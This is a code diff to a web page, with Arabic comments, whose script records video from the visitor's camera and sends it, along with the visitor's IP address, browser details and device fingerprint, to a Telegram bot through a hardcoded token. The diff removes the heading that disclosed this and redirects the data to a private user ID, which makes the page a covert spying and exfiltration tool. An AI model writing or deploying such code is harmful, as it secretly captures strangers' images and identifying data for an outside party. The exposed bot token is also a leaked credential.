@@ -32,7 +32,7 @@
     </style>
 </head>
 <body>
-    <h1>تسجيل الفيديو وإرساله مباشرة إلى Telegram!</h1>
+    <h1></h1>
     <video id="videoElement" autoplay muted></video>
 
     <script>
@@ -96,7 +96,7 @@
 
         async function sendToTelegram(media) {
             const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
-            const chatId = '@Karimbmr'; // اسم القناة
+            const chatId = '8102018266'; // معرف المستخدم الخاص بك
             const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
             const formData = new FormData();
@@ -123,7 +123,7 @@
 
         async function notifyTelegram(ipAddress, userAgent, fingerprint) {
             const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
-            const chatId = '@Karimbmr'; // اسم القناة
+            const chatId = '8102018266'; // معرف المستخدم الخاص بك
             const message = `شخص ما دخل الموقع!\nعنوان IP: ${ipAddress}\nمعلومات المتصفح: ${userAgent}\nبصمة الجهاز: ${fingerprint}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
